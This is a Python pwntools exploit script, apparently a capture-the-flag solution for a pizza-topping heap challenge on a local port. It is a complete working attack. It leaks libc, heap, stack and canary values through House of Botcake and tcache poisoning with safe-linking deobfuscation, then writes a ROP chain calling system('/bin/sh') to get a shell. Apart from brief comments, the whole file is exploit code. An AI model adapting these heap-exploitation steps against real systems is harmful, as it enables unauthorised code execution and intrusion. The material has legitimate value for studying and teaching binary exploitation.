from pwn import *

# context.log_level = 'debug'

toppings = ["Tomato", "Onion", "Capsicum", "Corn", "Mushroom", "Pineapple", "Olives", "Double Cheese", "Paneer", "Chicken"]

libc = ELF('./libc.so.6', checksec = False)


def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val



def malloc(idx, size):
    topping = toppings[idx]
    p.sendlineafter('choice : ', b'1')
    p.sendlineafter('topping ?', topping.encode())
    p.sendlineafter('much ?', str(size // 8).encode())

def free(idx):
    topping = toppings[idx]
    p.sendlineafter('choice : ', b'3')
    p.sendlineafter('remove ?', topping.encode())

def edit(idx, data):
    topping = toppings[idx]
    p.sendlineafter('choice : ', b'2')
    p.sendlineafter('customize ?', topping.encode())
    p.sendlineafter('topping :', data)

def view(idx):
    topping = toppings[idx]
    p.sendlineafter('choice : ', b'4')
    p.sendlineafter('verify ?', topping.encode())
    p.recvline()
    data = p.recvline()
    return data

# p = process('./chal')
p = remote('localhost', 10078)

#House of Botcake for OOB Read (Stack address)

for i in range(10):
    malloc(i, 0x88) #Allocate 10 chunks (7 tcache + 2 unsorted + 1 prevent top chunk consolidation)

for j in range(7):
    free(j) #Fill tcache

free(8) #Free victim chunk

libc_leak = u64(view(8)[:-1].ljust(8, b'\x00')) #Read value of libc main arena from unsorted bin chunk

libc.address = libc_leak - (0x7fe0c2c19ce0 - 0x7fe0c2a00000)

log.critical(f"libc leak : {hex(libc.address)}")

free(7) #Free chunk above victim chunk for consolidation

malloc(0, 0x88) #Make space for a chunk in tcache

free(8) #Send victim chunk into tcache (Freed second time)

heap_leak = deobfuscate(u64(view(8)[:-1].ljust(8, b'\x00'))) #Heap Leak from tcache chunk

log.critical(f"Heap leak : {hex(heap_leak)}")

pos = heap_leak + 0x1b0
ptr = libc.sym['environ']

malloc(1, 0x118) #Allocate overlapping chunk with freed victim chunk

edit(1, 17 * p64(0) + p64(0x91) + p64((pos >> 12) ^ ptr)) #Corrupting victim chunk fd ptr by editing overlapping chunk

malloc(8, 0x88) #Allocating victim chunk 

malloc(9, 0x88) #Allocated on environ


stack_leak = u64(view(9)[:-1].ljust(8, b'\x00'))

log.critical(f"Stack leak {hex(stack_leak)}")


#Perform similar attack to leak stack canary

for i in range(10):
    malloc(i, 0x118)

for i in range(7):
    free(i)

free(8)

free(7)

malloc(0, 0x118)

free(8)


malloc(9, 0x148)


pos = heap_leak + 0xbd0
ptr = stack_leak - 0x220 - 0x8 - 0x180 
log.critical(f"Pos : {hex(ptr)}")


edit(9, 35 * p64(0) + p64(0x121) + p64((pos >> 12) ^ ptr))

malloc(8, 0x118)
malloc(8, 0x118)

edit(8, b'a' * 8)
view(8)

canary = u64(p.recvline()[:-1].ljust(8,b'\x00'))*0x100
log.critical(f"canary : {hex(canary)}")

#Again perform similar attack this time to write ROP Chain on stack

for i in range(10):
    malloc(i, 0x98)

for i in range(7):
    free(i)

free(8)
free(7)

malloc(0, 0x98)

free(8)

malloc(9, 0x138)

pos = deobfuscate(u64(view(8)[:-1].ljust(8, b'\x00')))
log.critical(f"New pos : {hex(pos)}")
ptr = stack_leak - 0x220 - 0x8 - 0x10

edit(9, 0x98 * b'\x00' + p64(0x141) + p64((pos >> 12) ^ ptr))

malloc(8, 0x98)
malloc(8, 0x98)

pop_rdi = p64(libc.address + 0x000000000002a3e5)

binsh = p64(next(libc.search(b'/bin/sh')))

system = p64(libc.sym['system'])

ret = p64(libc.address + 0x0000000000029cd6)

edit(8, p64(0) + p64(canary) + p64(0) + pop_rdi + binsh + ret + system)


p.interactive()

